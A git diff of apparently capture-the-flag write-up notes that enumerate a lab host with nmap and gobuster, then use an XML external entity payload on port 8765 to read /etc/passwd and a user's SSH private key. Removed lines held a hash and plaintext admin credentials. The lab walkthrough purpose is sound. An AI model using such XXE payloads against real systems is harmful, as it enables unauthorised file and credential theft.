@@ -17,7 +17,12 @@ MAC Address: 02:B4:2B:A0:28:57 (Unknown)
 
 ```
 
-</br>gobuster command:
+</br> since basic port scanning shows http on 8765, we should be able to access this in a web browser
+![adminPanelOnThat](https://github.com/user-attachments/assets/c7819128-318c-40b0-aae2-16b387a773d2)
+</br> we should crack port 80 first, then if we have no leads, enumerate possible directories under this weird 8765 port too.
+
+
+</br>gobuster command targeting port 80:
 </br>gobuster dir -u http://10.10.215.126:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 </br>results:</br>
 ```
@@ -29,19 +34,24 @@ Progress: 220557 / 220558 (100.00%)
 
 ```
 
-</br>In the htl header, I can find this... Do I need to break this sha 384?</br>
+
+</br>In the html header on the source page, I can find this... Do I need to break this sha 384? I don't think I can traverse the structure... though this DOES tell me it's javascript being made with the node stack, since npm is node package manager.</br>
 ```
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>
 ```
 
+</br> There's also a /assets directory that the wordliss didn't catch, so add that to the notes of possible leads
+</br>![assetsFound3](https://github.com/user-attachments/assets/0a1f9b13-fa2b-48cb-acb0-1a36aac60be0)
+
+
+</br> Turns out there is a vector for possible cross site scripting injection on 8765
 </br>
-</br>admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
-</br>user: admin ; pass: 	bulldog19
-</br>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#detect-the-vulnerability
+![contactSendInjectionPossibility](https://github.com/user-attachments/assets/eff5f36c-04eb-460a-a6cb-4146f474ab95)
+
 
 </br>XXS - xml injection example:
-</br>(in the second line, changing `<!DOCTYPE root [<!ENTITY read SYSTEM '<command>'> ]>`])
-</br>modded to list sudo -l, but that does nothing... read file /etc/passwd from a payloads all the things example:
+</br>(in the second line, changing `<!DOCTYPE root [<!ENTITY read SYSTEM '<command>'> ]>`] allows me to inject other commands)
+</br>modded to list sudo -l, but that does nothing... next, try to read file /etc/passwd by modifying the code as shown in the sample below
 </br>
 ```
 <?xml version="1.0" encoding="UTF-8"?>
@@ -49,8 +59,8 @@ Progress: 220557 / 220558 (100.00%)
 <root><author>&read;</author></root>
 ```
 
-</br>reveals /home/joe
-</br>/home/barry
+</br>shows some users, as is the whole goal of peeking into /etc/passwd
+</br> --> /home/joe & /home/barry
 </br>
 </br>we got a user of barry, so after looking around found his file and his .ssh key
 </br>
@@ -62,7 +72,7 @@ Progress: 220557 / 220558 (100.00%)
 <root><author>&read;</author></root>
 ```
 
-</br>the format is terribly screwed up, but it'll be proper if we look in the sourcecode of the webpage
+</br>the format is terribly messed up, but it'll be proper if we look in the sourcecode of the webpage
 
 </br>*You must be able to identify proper formatting of rsa keys on sight and recognize when they are malformed. No one flippin' taught me this, and I want to punch a hole in a wall now
 
